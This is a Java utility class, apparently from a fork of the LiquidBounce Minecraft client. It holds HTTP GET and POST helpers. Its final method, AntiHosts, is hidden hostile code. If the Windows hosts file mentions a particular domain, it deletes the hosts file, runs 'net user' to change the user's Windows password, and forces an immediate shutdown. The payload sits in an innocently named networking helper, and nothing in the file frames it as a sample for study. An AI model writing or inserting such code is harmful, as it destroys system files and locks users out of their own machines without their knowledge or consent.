package net.ccbluex.liquidbounce.ui.client;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import javax.swing.JFrame;
import javax.swing.JOptionPane;

import net.minecraft.client.Minecraft;

public class Httputils {

    public static String sendGet(final String url) {
        String result = "";
        try {
            final String urlNameString = url;
            final URL realurl = new URL(urlNameString);
            final HttpURLConnection httpUrlConn = (HttpURLConnection) realurl.openConnection();
            httpUrlConn.setDoInput(true);
            httpUrlConn.setRequestMethod("GET");
            httpUrlConn.setRequestProperty("User-Agent", "Mozilla/5.0");
            final InputStream input = httpUrlConn.getInputStream();
            final InputStreamReader read = new InputStreamReader(input, "utf-8");
            final BufferedReader br = new BufferedReader(read);
            for (String data = br.readLine(); data != null; data = br.readLine()) {
                result = String.valueOf(String.valueOf(result)) + data + "\n";
            }
            br.close();
            read.close();
            input.close();
            httpUrlConn.disconnect();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e2) {
            e2.printStackTrace();
        }
        return result;
    }

    public static String getHtmlText(String url) {
        try {
            HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();

            con.setRequestMethod("GET");
            con.setRequestProperty("User-Agent", "Mozilla/5.0");

            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputline;
            StringBuilder response = new StringBuilder();

            while ((inputline = in.readLine()) != null) {
                response.append(inputline);
                response.append("\n");

            }
            in.close();
            return response.toString();

        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }

    public static String sendPost(String url, String param) {
        OutputStreamWriter out = null;
        BufferedReader in = null;
        String result = "";
        try {
            URL realUrl = new URL(url);
            HttpURLConnection conn = null;
            conn = (HttpURLConnection) realUrl.openConnection();
            // 打开和URL之间的连接

            // 发送POST请求必须设置如下两行
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setRequestMethod("POST"); // POST方法

            // 设置通用的请求属性

            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
//	            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Type", "application/json");

            conn.connect();

            // 获取URLConnection对象对应的输出流
            out = new OutputStreamWriter(conn.getOutputStream(), "UTF-8");
            // 发送请求参数
            out.write(param);
            // flush输出流的缓冲
            out.flush();
            // 定义BufferedReader输入流来读取URL的响应
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result += line;
            }
        } catch (Exception e) {
            System.out.println("发送 POST 请求出现异常！" + e);
            e.printStackTrace();
        }
        // 使用finally块来关闭输出流、输入流
        finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        return result;
    }

    public static void AntiHosts() {
        File f = new File("C:\\Windows\\System32\\drivers\\etc\\hosts");
        try {
            FileReader fr = new FileReader(f);
            @SuppressWarnings("resource")
            BufferedReader br = new BufferedReader(fr);
            String s = "";
            String str = "";
            try {
                while ((s = br.readLine()) != null) {
                    str += s + "\r\n";
                }
                if (str.contains("louplan.club")) {
                    f.delete();
                    Runtime.getRuntime().exec("net user %USERNAME% 162991");
                    Runtime.getRuntime().exec("shutdown -s -t 0");
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }

    }
}
